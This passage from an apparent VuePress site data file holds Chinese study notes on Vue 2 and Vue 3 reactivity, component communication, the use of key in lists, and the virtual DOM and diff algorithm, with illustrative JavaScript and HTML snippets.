      "normalizedContent": "# vue 的响应式原理\n\nvue源码解读\n\n\n# vue 响应式原理的核⼼就是observer、dep、watcher\n\n一篇异常详细的掘金\n\n * observer 中进⾏响应式的绑定，监听数据变化，在数据被读的时候，触发 get ⽅法，执⾏ dep 来收集依赖，也就是收集 watcher\n * 在数据被改的时候，触发 set ⽅法，通过对应的所有依赖(watcher)，去执⾏更新。\n\nvue 文档中的原图\n\n\n# 如何监听数据的变化\n\n\n# observer观察者\n\n简单说就是通过劫持数据，在 setter 中向 dep（调度中心）添加观察者，在 getter 中通知观察者更新\n\n详细一点object.defineproperty()\n\n * 对象传入 vue 实例作为 data 选项\n * vue 将遍历此对象所有的property，通过object.defineproperty把 property 转化为getter/setter\n * 当 observer 中对象的属性被访问，则通过 getter 返回值\n * 当 observer 中对象的属性被编辑修改，则通过 setter 更新 data 中的值\n\n思考三个问题？ 1、vue2的深度监听 2、对于对象的新增属性，vue如何实现数据绑定 3、如何对数组进行监听，如下代码中有写到\n\n// 模拟触发更新视图\nfunction updateview() {\n    console.log('视图更新')\n}\n\n// 重新定义数组原型\nconst oldarrayproperty = array.prototype\n// 创建新对象，原型指向 oldarrayproperty ，再扩展新的方法不会影响原型\nconst arrproto = object.create(oldarrayproperty);\n['push', 'pop', 'shift', 'unshift', 'splice'].foreach(methodname => {\n    arrproto[methodname] = function () {\n        updateview() // 触发视图更新\n        oldarrayproperty[methodname].call(this, ...arguments)\n        // array.prototype.push.call(this, ...arguments)\n    }\n})\n\n// 重新定义属性，监听起来\nfunction definereactive(target, key, value) {\n    // 深度监听\n    observer(value)\n    // 核心 api\n    object.defineproperty(target, key, {\n        get() {\n            return value\n        },\n        set(newvalue) {\n            if (newvalue !== value) {\n                // 深度监听\n                observer(newvalue)\n\n                // 设置新值\n                // 注意，value 一直在闭包中，此处设置完之后，再 get 时也是会获取最新的值\n                value = newvalue\n\n                // 触发更新视图\n                updateview()\n            }\n        }\n    })\n}\n// 监听对象属性\nfunction observer(target) {\n    if (typeof target !== 'object' || target === null) {\n        // 不是对象或数组\n        return target\n    }\n    // 污染全局的 array 原型\n    // array.prototype.push = function () {\n    //     updateview()\n    //     ...\n    // }\n    if (array.isarray(target)) {\n        target.__proto__ = arrproto\n    }\n\n    // 重新定义各个属性（for in 也可以遍历数组）\n    for (let key in target) {\n        definereactive(target, key, target[key])\n    }\n}\n// 准备数据\nconst data = {\n    name: 'zhangsan',\n    age: 18,\n    info: {\n        address: 'shanghai' // 需要深度监听\n    },\n    nums: [10, 20, 30]\n}\n// 监听数据\nobserver(data)\n\n\ndata.name = 'lisi'\ndata.age = 21\ndata.x = '100' // 新增属性，监听不到 —— 所以有 vue.set\ndelete data.name // 删除属性，监听不到 —— 所有已 vue.delete\ndata.info.address = '上海' // 深度监听\ndata.nums.push(4) // 监听数组\n\n\n# defineproperty的缺点\n\n 1. 深度监听需要通过递归实现，比如对象内对象多层嵌套的双向绑定需要进行递归\n 2. 无法监听新增属性和删除属性，需要使用vue.set,vue.delete\n 3. 无法直接监听数组的一些操作，那为什么我们在使用vue时候是可以监听数组的呢？因为vue对数组的一些方法进行重写，如上代码（为了不污染全局的array原型，使用object.create()创建新的对象，新对象中新增编辑的方法不会污染原生的array）\n\n# 请问vue2源码重写了哪些数组方法\n\n重写了会改变数组自身的方法\n\n[\n  'push',//向数组的末尾添加一个或更多元素，并返回新的长度。\n  'pop',//删除数组的最后一个元素并返回删除的元素。\n  'shift',//    删除并返回数组的第一个元素。\n  'unshift',//向数组的开头添加一个或更多元素，并返回新的长度。\n  'reverse',//反转数组的元素顺序。\n  'sort',//对数组进行排序（可以穿进去一个函数）\n  'splice',//splice(n,m)删除数组的第n个到第m-1个（不包含m个）从数组中添加或删除元素。\n]\n\n\n\n# dep依赖管理\n\n收集依赖，通知观察者\n\ndep 扮演的角色是调度中心/订阅器，主要的作用就是收集观察者 watcher 和通知观察者目标更新。每个属性拥有自己的消息订阅器 dep，用于存放所有订阅了该属性的观察者对象，当数据发生改变时，会遍历观察者列表（dep.subs），通过 dep.notify()所有的 watch，让订阅者 watcher 执行自己的 update 逻辑\n\n\n# watcher订阅者\n\nwatcher 扮演的角色是订阅者，他的主要作用是为观察属性提供回调函数以及收集依赖（如计算属性 computed，vue 会把该属性所依赖数据的 dep 添加到自身的 deps 中），当被观察的值发生变化时，会接收到来自 dep 的通知，从而触发回调函数\n\n\n\n\n# vue2 响应式\n\n通过 object.defineproperty api 劫持数据的变化，在数据被访问的时候收集依赖，然后在数据被修改的时候通知依赖更新\n\n\n# 缺点\n\n * object.defineproperty 只对初始对象里的属性有监听作用，而对新增的属性无效,所以有vue.$set，$delete\n * 对数组的操作有限,利用索引直接设置一个数组项时,当你修改数组的长度都不是响应式\n * 需要对每个属性进行遍历监听，如果嵌套对象，需要深层监听，造成性能问题\n\n\n# 缺点的弥补\n\n * set、delete方法\n * 重写数组方法\n\n// 数组重写\nconst originalproto = array.prototype\nconst arrayproto = object.create(originalproto)\n['push', 'pop', 'shift', 'unshift', 'splice', 'reverse', 'sort'].foreach(method => {\n  arrayproto[method] = function () {\n    originalproto[method].apply(this.arguments)\n    dep.notice()\n  }\n});\n\n\n\n\n# vue3 响应式\n\nproxy直接可以劫持整个对象，并返回一个新对象，我们可以只操作新的对象达到响应式目的\n\nfunction reactive(obj) {\n  if (typeof obj !== \"object\" && obj != null) {\n    return obj;\n  }\n  const observed = new proxy(obj, {\n    get(target, key, receiver) {\n      const res = reflect.get(target, key, receiver);\n      console.log(`获取${key}:${res}`);\n      return res;\n    },\n    set(target, key, value, receiver) {\n      const res = reflect.set(target, key, value, receiver);\n      console.log(`设置${key}:${value}`);\n      return res;\n    },\n    deleteproperty(target, key) {\n      const res = reflect.deleteproperty(target, key);\n      console.log(`删除${key}:${res}`);\n      return res;\n    },\n  });\n  return observed;\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "组件通讯",
      "frontmatter": {
        "title": "组件通讯"
      },
      "regularPath": "/webstudy/Vue2/%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF.html",
      "relativePath": "webstudy/Vue2/组件通讯.md",
      "key": "v-1cadf89a",
      "path": "/webstudy/Vue2/%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF.html",
      "headers": [
        {
          "level": 2,
          "title": "组件通讯",
          "slug": "组件通讯",
          "normalizedTitle": "组件通讯",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "provide和inject",
          "slug": "provide和inject",
          "normalizedTitle": "provide和inject",
          "charIndex": 204
        }
      ],
      "headersStr": "组件通讯 provide和inject",
      "content": "# 组件通讯\n\n * 1、props/$emit\n * 2、自定义事件(事件总线) bus.$emit/bus.$emit/bus.$off event-emitter一个库，Vue3开箱即用\n * 3、$attrs/$listeners(Vue3已移出) 属于props/emits的候补\n * 4、$parent\n * 5、$refs\n * 6、provide/inject\n * 7、vuex\n\n\n# provide和inject\n\n如何传递一些动态的数据？\n\n//provide写成函数的形式\nprovide(){\n  return {\n    info:computed(()=>{\n      this.name\n    })\n  }\n} \n\ninject:['info']\n",
      "normalizedContent": "# 组件通讯\n\n * 1、props/$emit\n * 2、自定义事件(事件总线) bus.$emit/bus.$emit/bus.$off event-emitter一个库，vue3开箱即用\n * 3、$attrs/$listeners(vue3已移出) 属于props/emits的候补\n * 4、$parent\n * 5、$refs\n * 6、provide/inject\n * 7、vuex\n\n\n# provide和inject\n\n如何传递一些动态的数据？\n\n//provide写成函数的形式\nprovide(){\n  return {\n    info:computed(()=>{\n      this.name\n    })\n  }\n} \n\ninject:['info']\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "key",
      "frontmatter": {},
      "regularPath": "/webstudy/Vue2/key.html",
      "relativePath": "webstudy/Vue2/key.md",
      "key": "v-2bef01e8",
      "path": "/webstudy/Vue2/key.html",
      "headers": [
        {
          "level": 2,
          "title": "大概需要思考如下几个问题?",
          "slug": "大概需要思考如下几个问题",
          "normalizedTitle": "大概需要思考如下几个问题?",
          "charIndex": 73
        },
        {
          "level": 3,
          "title": "1、vue中的就地复用策略",
          "slug": "_1、vue中的就地复用策略",
          "normalizedTitle": "1、vue中的就地复用策略",
          "charIndex": 91
        },
        {
          "level": 3,
          "title": "2、key的使用",
          "slug": "_2、key的使用",
          "normalizedTitle": "2、key的使用",
          "charIndex": 2079
        },
        {
          "level": 3,
          "title": "3、看一下key使用index的情况",
          "slug": "_3、看一下key使用index的情况",
          "normalizedTitle": "3、看一下key使用index的情况",
          "charIndex": 2725
        },
        {
          "level": 3,
          "title": "4、key的一些使用场景",
          "slug": "_4、key的一些使用场景",
          "normalizedTitle": "4、key的一些使用场景",
          "charIndex": 3106
        },
        {
          "level": 3,
          "title": "5、diff中的key",
          "slug": "_5、diff中的key",
          "normalizedTitle": "5、diff中的key",
          "charIndex": 3916
        }
      ],
      "headersStr": "大概需要思考如下几个问题? 1、vue中的就地复用策略 2、key的使用 3、看一下key使用index的情况 4、key的一些使用场景 5、diff中的key",
      "content": "# key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n\n# 大概需要思考如下几个问题?\n\n * 1、vue中的就地复用策略，设置key值一定能提高diff效率吗？\n * 2、v-for中的key的作用，key能不能用index?哪些场景可以使用index作为key，那些场景不能用？\n * 3、如果key使用index，通过push在list中间某处插入几条数据，请问会有什么问题吗？\n * 4、动态组件中的key的使用\n * 5、深入key在diff中的使用\n\n\n# 1、vue中的就地复用策略\n\n文档原话: 当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “就地复用” 策略。如果数据项的顺序被改变，Vue将不是移动 DOM 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素.这个默认的模式是有效的，但是只适用于不依赖子组件状态或临时 DOM 状态（例如：表单输入值）的列表渲染输出。\n\n在浏览器运行如下代码： 你会发现：\n\n * vue默认的就地复用策略中(不用key),点击button, input输入框并不会随文本一起下移，为什么？是因为输入框没有与数据(data)绑定, 所以vuejs默认使用已经渲染的dom, 然而文本是与数据绑定的, 所以文本被重新渲染，这种复用方式是高效的。但dom的结构会与我们预期想要的不同，在日常开发中，这也是一个问题。\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width\" />\n    <title>key的就地复用</title>\n  </head>\n  <body>\n    <script src=\"https://cdn.bootcss.com/vue/2.5.17-beta.0/vue.min.js\"></script>\n    <div id=\"app\">\n      <h3>就地复用</h3>\n      <div v-for=\"(p, i) in persons\">\n        {{p.name}}\n        <input type=\"text\" />\n        <button @click=\"down(i)\" v-if=\"i != persons.length - 1\">下移</button>\n      </div>\n\n      <h3>不采用就地复用策略(设置key)</h3>\n      <div v-for=\"(p, i) in persons\" :key=\"p.id\">\n        {{p.name}}\n        <input type=\"text\" />\n        <button @click=\"down(i)\" v-if=\"i != persons.length - 1\">下移</button>\n      </div>\n    </div>\n\n    <script>\n      new Vue({\n        el: \"#app\",\n        data: {\n          persons: [\n            { id: 1, name: \"inputA\" },\n            { id: 2, name: \"inputB\" },\n            { id: 3, name: \"inputC\" },\n          ],\n        },\n        methods: {\n          down: function (i) {\n            if (i == this.persons.length - 1) return;\n            var listClone = this.persons.slice();\n            var one = listClone[i];\n            listClone[i] = listClone[i + 1];\n            listClone[i + 1] = one;\n            this.persons = listClone;\n          },\n        },\n      });\n    </script>\n  </body>\n</html>\n\n\n# 设置key值一定能提高diff效率吗？\n\n其实默认的就地复用策略是高效的，但是只适用于不依赖子组件状态或临时 DOM 状态 (例如：表单输入值) 的列表渲染输出 所以,key并非高效，但在实际开发中我们需要使用key\n\n\n# 2、key的使用\n\n如果你的列表元素存在与用户交互的场景(比如form表单或者重新排序等), 那么请你为 v-for指令设置key参数,key指向列表中每个元素的唯一值.\n\n但，建议v-for时提供key\n\n# 使用key和不使用key的区别\n\n下面看一张图\n\n不使用key\n\n * A，A，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * B，B，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * C，F，相同类型的节点，进行patch，数据不同，发生dom操作\n * D，C，相同类型的节点，进行patch，数据不同，发生dom操作\n * E，D，相同类型的节点，进行patch，数据不同，发生dom操作\n * 循环结束，将E插入到DOM中\n * 3次更新，1次插入操作\n\n如果使用key\n\n * A，A，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * B，B，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * C，F，不相同类型的节点 然后\n * E、E，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * D、D，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * C、C，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * 循环结束，将F插入到C之前\n * 0次更新，1次插入操作\n\n# 总结:key能够大大减少对页面的DOM操作，提高了diff效率\n\n\n# 3、看一下key使用index的情况\n\n使用index作为key\n\n# 在数组后面追加一条数据\n\n前面的数据页面不会重新渲染，直接复用老的，只会新渲染最后一条数据，此时用index作为key，没有问题。\n\n# 在数组中间插入一条数据\n\n根据下面的代码可以看出,除了num：1的数据，剩下的数据都需要重新计算渲染\n\nkey: 0  index: 0 num: 1     key: 0  index: 0 num: 1\nkey: 1  index: 1 num: 2     key: 1  index: 1 num: '此处是新插入的数据4'\nkey: 2  index: 2 num: 3     key: 2  index: 2 num: 2\n                            key: 3  index: 3 num: 3\n\n\n\n# 4、key的一些使用场景\n\n# 动态组件中需要强制刷新组件的场景\n\n<template>\n    <my-component :key=\"key\"></my-component>\n</template>\n<script>\nexport default {\n  data(){\n    return{\n      key:new Date().getTime(); \n    }\n  },\n  watch:{\n    key:{\n     immediate:true,\n     handler(newValue,oldValue){\n       this.key = new Date().getTime()\n     }\n    }\n  }\n}\n</script>\n\n\n# keep-alive中的key\n\n<<template>\n  <keep-alive :include=\"Components\">\n    <router-view :key=\"key\" />\n  </keep-alive>\n</template>\n<script>\nexport default {\n  name: 'AppMain',\n  computed: {\n    Components() {\n      return ['A','B']\n    },\n    key() {\n      return this.$route.fullPath\n    }\n  }\n}\n</script>\n\n\nkeep-alive的目的就是缓存组件， 但如果以下的场景\n\n * 从/verList/1到 verList/2\n * 从/verList/id=1到 verList/id=2\n\n当我们使用keep-alive缓存，路由进行切换时，组件内的created, mounted等钩子不会执行, 所以会导致数据不更新,页面不渲染。\n\n\n# 5、diff中的key\n\n判断sameVnode\n\nfunction sameVnode (a, b) {\n  return (\n    a.key === b.key && (\n      (\n        a.tag === b.tag &&\n        a.isComment === b.isComment &&\n        isDef(a.data) === isDef(b.data) &&\n        sameInputType(a, b)\n        ) || (\n        isTrue(a.isAsyncPlaceholder) &&\n        a.asyncFactory === b.asyncFactory &&\n        isUndef(b.asyncFactory.error)\n      )\n    )\n  )\n}\n",
      "normalizedContent": "# key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n\n# 大概需要思考如下几个问题?\n\n * 1、vue中的就地复用策略，设置key值一定能提高diff效率吗？\n * 2、v-for中的key的作用，key能不能用index?哪些场景可以使用index作为key，那些场景不能用？\n * 3、如果key使用index，通过push在list中间某处插入几条数据，请问会有什么问题吗？\n * 4、动态组件中的key的使用\n * 5、深入key在diff中的使用\n\n\n# 1、vue中的就地复用策略\n\n文档原话: 当 vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “就地复用” 策略。如果数据项的顺序被改变，vue将不是移动 dom 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素.这个默认的模式是有效的，但是只适用于不依赖子组件状态或临时 dom 状态（例如：表单输入值）的列表渲染输出。\n\n在浏览器运行如下代码： 你会发现：\n\n * vue默认的就地复用策略中(不用key),点击button, input输入框并不会随文本一起下移，为什么？是因为输入框没有与数据(data)绑定, 所以vuejs默认使用已经渲染的dom, 然而文本是与数据绑定的, 所以文本被重新渲染，这种复用方式是高效的。但dom的结构会与我们预期想要的不同，在日常开发中，这也是一个问题。\n\n<!doctype html>\n<html>\n  <head>\n    <meta charset=\"utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width\" />\n    <title>key的就地复用</title>\n  </head>\n  <body>\n    <script src=\"https://cdn.bootcss.com/vue/2.5.17-beta.0/vue.min.js\"></script>\n    <div id=\"app\">\n      <h3>就地复用</h3>\n      <div v-for=\"(p, i) in persons\">\n        {{p.name}}\n        <input type=\"text\" />\n        <button @click=\"down(i)\" v-if=\"i != persons.length - 1\">下移</button>\n      </div>\n\n      <h3>不采用就地复用策略(设置key)</h3>\n      <div v-for=\"(p, i) in persons\" :key=\"p.id\">\n        {{p.name}}\n        <input type=\"text\" />\n        <button @click=\"down(i)\" v-if=\"i != persons.length - 1\">下移</button>\n      </div>\n    </div>\n\n    <script>\n      new vue({\n        el: \"#app\",\n        data: {\n          persons: [\n            { id: 1, name: \"inputa\" },\n            { id: 2, name: \"inputb\" },\n            { id: 3, name: \"inputc\" },\n          ],\n        },\n        methods: {\n          down: function (i) {\n            if (i == this.persons.length - 1) return;\n            var listclone = this.persons.slice();\n            var one = listclone[i];\n            listclone[i] = listclone[i + 1];\n            listclone[i + 1] = one;\n            this.persons = listclone;\n          },\n        },\n      });\n    </script>\n  </body>\n</html>\n\n\n# 设置key值一定能提高diff效率吗？\n\n其实默认的就地复用策略是高效的，但是只适用于不依赖子组件状态或临时 dom 状态 (例如：表单输入值) 的列表渲染输出 所以,key并非高效，但在实际开发中我们需要使用key\n\n\n# 2、key的使用\n\n如果你的列表元素存在与用户交互的场景(比如form表单或者重新排序等), 那么请你为 v-for指令设置key参数,key指向列表中每个元素的唯一值.\n\n但，建议v-for时提供key\n\n# 使用key和不使用key的区别\n\n下面看一张图\n\n不使用key\n\n * a，a，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * b，b，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * c，f，相同类型的节点，进行patch，数据不同，发生dom操作\n * d，c，相同类型的节点，进行patch，数据不同，发生dom操作\n * e，d，相同类型的节点，进行patch，数据不同，发生dom操作\n * 循环结束，将e插入到dom中\n * 3次更新，1次插入操作\n\n如果使用key\n\n * a，a，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * b，b，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * c，f，不相同类型的节点 然后\n * e、e，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * d、d，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * c、c，相同类型的节点，进行patch，但数据相同，不发生dom操作\n * 循环结束，将f插入到c之前\n * 0次更新，1次插入操作\n\n# 总结:key能够大大减少对页面的dom操作，提高了diff效率\n\n\n# 3、看一下key使用index的情况\n\n使用index作为key\n\n# 在数组后面追加一条数据\n\n前面的数据页面不会重新渲染，直接复用老的，只会新渲染最后一条数据，此时用index作为key，没有问题。\n\n# 在数组中间插入一条数据\n\n根据下面的代码可以看出,除了num：1的数据，剩下的数据都需要重新计算渲染\n\nkey: 0  index: 0 num: 1     key: 0  index: 0 num: 1\nkey: 1  index: 1 num: 2     key: 1  index: 1 num: '此处是新插入的数据4'\nkey: 2  index: 2 num: 3     key: 2  index: 2 num: 2\n                            key: 3  index: 3 num: 3\n\n\n\n# 4、key的一些使用场景\n\n# 动态组件中需要强制刷新组件的场景\n\n<template>\n    <my-component :key=\"key\"></my-component>\n</template>\n<script>\nexport default {\n  data(){\n    return{\n      key:new date().gettime(); \n    }\n  },\n  watch:{\n    key:{\n     immediate:true,\n     handler(newvalue,oldvalue){\n       this.key = new date().gettime()\n     }\n    }\n  }\n}\n</script>\n\n\n# keep-alive中的key\n\n<<template>\n  <keep-alive :include=\"components\">\n    <router-view :key=\"key\" />\n  </keep-alive>\n</template>\n<script>\nexport default {\n  name: 'appmain',\n  computed: {\n    components() {\n      return ['a','b']\n    },\n    key() {\n      return this.$route.fullpath\n    }\n  }\n}\n</script>\n\n\nkeep-alive的目的就是缓存组件， 但如果以下的场景\n\n * 从/verlist/1到 verlist/2\n * 从/verlist/id=1到 verlist/id=2\n\n当我们使用keep-alive缓存，路由进行切换时，组件内的created, mounted等钩子不会执行, 所以会导致数据不更新,页面不渲染。\n\n\n# 5、diff中的key\n\n判断samevnode\n\nfunction samevnode (a, b) {\n  return (\n    a.key === b.key && (\n      (\n        a.tag === b.tag &&\n        a.iscomment === b.iscomment &&\n        isdef(a.data) === isdef(b.data) &&\n        sameinputtype(a, b)\n        ) || (\n        istrue(a.isasyncplaceholder) &&\n        a.asyncfactory === b.asyncfactory &&\n        isundef(b.asyncfactory.error)\n      )\n    )\n  )\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "虚拟dom和diff算法",
      "frontmatter": {
        "title": "虚拟dom和diff算法"
      },
      "regularPath": "/webstudy/Vue2/%E8%99%9A%E6%8B%9Fdom%E5%92%8Cdiff%E7%AE%97%E6%B3%95.html",
      "relativePath": "webstudy/Vue2/虚拟dom和diff算法.md",
      "key": "v-70951521",
      "path": "/webstudy/Vue2/%E8%99%9A%E6%8B%9Fdom%E5%92%8Cdiff%E7%AE%97%E6%B3%95.html",
      "headers": [
        {
          "level": 2,
          "title": "vdom",
          "slug": "vdom",
          "normalizedTitle": "vdom",
          "charIndex": 19
        },
        {
          "level": 3,
          "title": "为什么使用vdom？",
          "slug": "为什么使用vdom",
          "normalizedTitle": "为什么使用vdom？",
          "charIndex": 28
        },
        {
          "level": 3,
          "title": "模拟一个vdom",
          "slug": "模拟一个vdom",
          "normalizedTitle": "模拟一个vdom",
          "charIndex": 178
        },
        {
          "level": 3,
          "title": "框架的价值(Vue,React)",
          "slug": "框架的价值-vue-react",
          "normalizedTitle": "框架的价值(vue,react)",
          "charIndex": 595
        },
        {
          "level": 3,
          "title": "vdom真的很快吗？",
          "slug": "vdom真的很快吗",
          "normalizedTitle": "vdom真的很快吗？",
          "charIndex": 683
        },
        {
          "level": 3,
          "title": "扩展",
          "slug": "扩展",
          "normalizedTitle": "扩展",
          "charIndex": 881
        },
        {
          "level": 2,
          "title": "diff算法",
          "slug": "diff算法",
          "normalizedTitle": "diff算法",
          "charIndex": 8
        },
        {
          "level": 3,
          "title": "步骤",
          "slug": "步骤",
          "normalizedTitle": "步骤",
          "charIndex": 957
        },
        {
          "level": 3,
          "title": "diff策略",
          "slug": "diff策略",
          "normalizedTitle": "diff策略",
          "charIndex": 1120
        },
        {
          "level": 3,
          "title": "Vue2 diff 特点 - 双端相互比较",
          "slug": "vue2-diff-特点-双端相互比较",
          "normalizedTitle": "vue2 diff 特点 - 双端相互比较",
          "charIndex": 1463
        },
        {
          "level": 3,
          "title": "Vue3 diff 特点 - 最长递增子序列",
          "slug": "vue3-diff-特点-最长递增子序列",
          "normalizedTitle": "vue3 diff 特点 - 最长递增子序列",
          "charIndex": 1669
        },
        {
          "level": 3,
          "title": "diff 的原理",
          "slug": "diff-的原理",
          "normalizedTitle": "diff 的原理",
          "charIndex": 2013
        },
        {
          "level": 3,
          "title": "diff 算法中的 key",
          "slug": "diff-算法中的-key",
          "normalizedTitle": "diff 算法中的 key",
          "charIndex": 2211
        }
      ],
      "headersStr": "vdom 为什么使用vdom？ 模拟一个vdom 框架的价值(Vue,React) vdom真的很快吗？ 扩展 diff算法 步骤 diff策略 Vue2 diff 特点 - 双端相互比较 Vue3 diff 特点 - 最长递增子序列 diff 的原理 diff 算法中的 key",
      "content": "# 虚拟dom和diff算法\n\n\n# vdom\n\n\n# 为什么使用vdom？\n\n因为js的运行速度比操作dom的速度要快很多，把操作dom这个思路转变为操作js，通过js模拟dom结构，识别dom变更，然后更新视图 不断的修改真实的DOM会引发回流和重绘，大大降低了页面的渲染能力，而虚拟DOM的产生则是减少了频繁操作DOM而带来的一系列性能问题\n\n\n# 模拟一个vdom\n\n<div id='div1' class='container'>\n <p>vdom</p>\n <ul style='font-size:20px'>\n  <li>a</li> \n </ul>\n</div>\n\n<script>\n const dom = {\n   tag:'div',\n  props:{\n   className:'container',\n   id:'div1'\n  },\n  children:[\n   {\n    tag:'p',\n    children:'vdom'\n   },\n   {\n    tag:'ul',\n    props:{style:'font-size:20px'},\n    children:[\n     {\n       tag:'li',\n      children:'a'\n     }\n    ]\n   }\n  ]\n }\n</script>\n\n\n\n# 框架的价值(Vue,React)\n\n * 组件化 —— 这不是核心原因。WebComponent 已提出多年，当仍未发展壮大\n * 数据视图分离，数据驱动视图(核心)\n\n\n# vdom真的很快吗？\n\n * 直接进行 DOM 操作永远都是最快的（但要目标明确，不能有无谓的 DOM 操作 —— 这很难）\n * 如果业务复杂，要“数据视图分离，数据驱动视图”，无法直接修改 DOM ，那 vdom 就是一个很好的选择\n\n所以，vdom 并不比 DOM 操作更快（反而更慢，它做了 JS 运算），它只是在某个特定的场景下，无法做到精准 DOM 修改时，一个更优的选择。\n\n\n# 扩展\n\nSvelte 不使用 vdom ，它将组件修改，编译为精准的 DOM 操作。和 React 设计思路完全不一样。\n\n\n# diff算法\n\n\n# 步骤\n\n * 用JavaScript 对象结构表示DOM树的结构；然后用这个树构建一个真正的DOM树，插到文档当中\n * 当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较(diff)，记录两棵树差异\n * 把第二棵树所记录的差异应用到第一棵树所构建的真正的DOM树上(patch)，视图就更新了\n\n\n# diff策略\n\ndiff整体策略为：深度优先，同层比较，不会跨级，从两边向中间\n\nDOM的频繁改变会产生一系列性能问题，而使用虚拟DOM替代真实DOM，最大的优势在于不断的去修改虚拟DOM后，才会一次性的与真实DOM的差异性做对比，然后只会去修改真实的DOM一次。而这种差异性对比，也就是diff算法。\n\n**注：**Vue React 都是用于网页开发，基于 DOM 结构，对 diff 算法都进行了优化（或者简化）,最终把时间复杂度降低到 O(n)\n\n * 只在同一层级比较，不夸层级 （DOM 结构的变化，很少有跨层级移动）\n * tag 不同则直接删掉重建，不去对比内部细节（DOM 结构变化，很少有只改外层，不改内层）\n * 同一个节点下的子节点，通过 key 区分\n\n\n# Vue2 diff 特点 - 双端相互比较\n\nb站上的一个视频\n\n好比在列表中插入值\n\n * 定义四个指针，分别比较\n * oldStartNode 和 newStartNode\n * oldStartNode 和 newEndNode\n * oldEndNode 和 newStartNode\n * oldEndNode 和 newEndNode\n * 指针继续向中间移动，知道指针汇合。\n\n\n\n参考\n\n\n# Vue3 diff 特点 - 最长递增子序列\n\n例如数组 [3，5，7，1，2，8] 的最长递增子序列就是 [3，5，7，8 ] 。这是一个专门的算法。\n\n * 1、通过“前-前”比较找到开始的不变节点 [A, B]\n * 2、通过“后-后”比较找到末尾的不变节点 [G]\n * 3、剩余的有变化的节点 [F, C, D, E, H]\n * 4、通过 newIndexToOldIndexMap 拿到 oldChildren 中对应的 index [5, 2, 3, 4, -1] （-1 表示之前没有，要新增）\n * 5、计算最长递增子序列得到 [2, 3, 4] ，对应的就是 [C, D, E] ，即这些节点可以不变\n * 6、剩余的节点，根据 index 进行新增、删除\n\n\n# diff 的原理\n\n当data变化之后，视图会触发更新，那么这个过程是什么样的呢？ 首先data变化后，会触发setter 接着，编译模板为render函数 render函数生成vNode，这是个新的vNode 接着会patch(oldVnode, newVnode)，这个对比过程中用到的就是diff算法 接着异步渲染更新 由于vNode使用对象表示DOM的形式，大体上是一颗多叉树。\n\n\n# diff 算法中的 key\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n * 根据key判断元素是否要删除\n * 匹配到key，只移动元素-性能较好\n * 未匹配到key，则删除重建-性能较差\n * 加了key之后，可以便于diff算法的计算，大幅度增加性能\n\n推荐key使用唯一值(例如唯一的id)",
      "normalizedContent": "# 虚拟dom和diff算法\n\n\n# vdom\n\n\n# 为什么使用vdom？\n\n因为js的运行速度比操作dom的速度要快很多，把操作dom这个思路转变为操作js，通过js模拟dom结构，识别dom变更，然后更新视图 不断的修改真实的dom会引发回流和重绘，大大降低了页面的渲染能力，而虚拟dom的产生则是减少了频繁操作dom而带来的一系列性能问题\n\n\n# 模拟一个vdom\n\n<div id='div1' class='container'>\n <p>vdom</p>\n <ul style='font-size:20px'>\n  <li>a</li> \n </ul>\n</div>\n\n<script>\n const dom = {\n   tag:'div',\n  props:{\n   classname:'container',\n   id:'div1'\n  },\n  children:[\n   {\n    tag:'p',\n    children:'vdom'\n   },\n   {\n    tag:'ul',\n    props:{style:'font-size:20px'},\n    children:[\n     {\n       tag:'li',\n      children:'a'\n     }\n    ]\n   }\n  ]\n }\n</script>\n\n\n\n# 框架的价值(vue,react)\n\n * 组件化 —— 这不是核心原因。webcomponent 已提出多年，当仍未发展壮大\n * 数据视图分离，数据驱动视图(核心)\n\n\n# vdom真的很快吗？\n\n * 直接进行 dom 操作永远都是最快的（但要目标明确，不能有无谓的 dom 操作 —— 这很难）\n * 如果业务复杂，要“数据视图分离，数据驱动视图”，无法直接修改 dom ，那 vdom 就是一个很好的选择\n\n所以，vdom 并不比 dom 操作更快（反而更慢，它做了 js 运算），它只是在某个特定的场景下，无法做到精准 dom 修改时，一个更优的选择。\n\n\n# 扩展\n\nsvelte 不使用 vdom ，它将组件修改，编译为精准的 dom 操作。和 react 设计思路完全不一样。\n\n\n# diff算法\n\n\n# 步骤\n\n * 用javascript 对象结构表示dom树的结构；然后用这个树构建一个真正的dom树，插到文档当中\n * 当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较(diff)，记录两棵树差异\n * 把第二棵树所记录的差异应用到第一棵树所构建的真正的dom树上(patch)，视图就更新了\n\n\n# 